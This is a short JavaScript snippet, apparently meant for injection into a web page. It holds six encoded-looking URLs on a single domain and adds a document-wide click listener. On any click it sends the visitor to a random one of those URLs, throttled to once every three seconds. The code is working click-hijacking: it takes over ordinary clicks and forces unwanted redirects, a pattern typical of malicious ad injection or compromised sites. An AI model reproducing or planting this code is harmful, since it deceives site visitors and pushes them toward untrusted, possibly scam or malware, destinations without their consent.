function init() {
  var arr = [
    "https://novel-psychology.com/bj3.V/0/PI3JpMvXbcmrVGJtZ/DD0/1/M_zVMjxBNpjDEXzYLAT-U/zcMOzTEn2hMQTfQn",
    "https://novel-psychology.com/bf3vV/0.PK3XpRv/bpmKVAJnZvDw0a1XMZz/Ed0/OzT/UF5bL/TkU/z/MaTfQk5XNQj_AG",
    "https://novel-psychology.com/bD3_VY0.PQ3RptvUbpmkV/J/ZqDx0p1NMcTOkY5/N/DnAL4ALpTEUexcO/TMkm0wM/DLkC",
    "https://novel-psychology.com/b.3/Vi0SPt3yp-v/bJmaVHJnZUDM0P1EMiTIkF5/NJDRA/wMLlTxULxpOATekm0OM/DSEn",
    "https://novel-psychology.com/bv3hVu0.PX3/p/vEbCm_VrJhZgDY0i1TMfjTUTybNgj/Un2pLZT-UwyWNuTCIp2/NdT-cR",
    "https://novel-psychology.com/b.3uVq0-Pv3bpGvibBmUV/J/ZjD/0V1MMcTHku5EM/z/ghyBLSTWUGxPODTQkjzlOADsMz",
  ];
 
  var didOpen = false;
  // 监听页面的点击事件
  document.addEventListener("click", function() {
    if (didOpen) {
      return;
    }
    didOpen = true;
    setTimeout(() => {
      didOpen = false;
    }, 3000);

    var randomIndex = Math.floor(Math.random() * arr.length);
    var randomLink = arr[randomIndex];
    window.location.href = randomLink;
  });
}

init();